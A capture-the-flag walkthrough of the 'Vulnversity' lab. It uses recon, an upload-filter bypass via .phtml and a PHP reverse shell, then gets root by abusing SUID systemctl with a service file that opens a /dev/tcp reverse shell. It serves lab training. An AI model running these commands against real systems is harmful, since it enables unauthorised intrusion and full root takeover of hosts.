
## **Vulnversity**

```
nmap -sC -sV <IP>
```

```
gobuster dir -u <IP:3333> -w <wordlist>
```

We found directory internal/ with upload option

Now for upload we are going to use burp suite for it and intercept file upload

We uploaded a php file but it didn’t work so we will try something other

Copy these types and check which php file can be uploaded

```
php2
php3
php4
php5
phtml
```

Select request in burp suite and send it to intruder

Now select the uploaded file name from intruder and Click Add$

In payload configuration paste the php list

Start attack à and it didn’t show us but we can see that the file which can be uploaded is 5 letters so its .phtml file

```
scp php-reverse-shell.php ../shell.phtml
```

Change IP and port of this shell (Php reverse shell from pentest monkey)

Upload the shell.phtml file now

Run a netcat listener now

```
nc -lvnp 1234
```

Go to uploads folder now

```
https://<ip>:3333/internal/uploads
```

Click on the shell.phtml

And now we got a reverse shell connection

```
cat /etc/passwd
```

We got a new username bill and let’s try to get into bill

```
cd /home/bill
```

```
ls
```

we found a user.txt which contains our first flag

Now let’s search for all SUID files

```
find / -user root -perm -4000 2>/dev/null
```

The one that stands out here is /bin/systemctl

Now we will first create a service file

```
subl root.service
```
Now paste this, here we Made user as root and we are using bin/bash to get privilege escalation

```
[Unit]

Description=root

[Service]

Type=Simple

User=root

ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.158.198/4444 0>&1'

[Install]

WantedBy=multi-user.target
```


Now save the file and run a python on http server from our cmd and later access it on the shell

```
python3 -m http.server 8000
```

Now do wget in it

```
wget http://<ip>/root.service -O /tmp/root.service
```

Now set an netcat listener

```
nc -lvnp 4444
```

```
systemctl enable /tmp/root.service
```

```
systemctl start root
```

Now in our netcat listener we got root connection

```
cd root
```

```
cat root.txt
```

We got our final root flag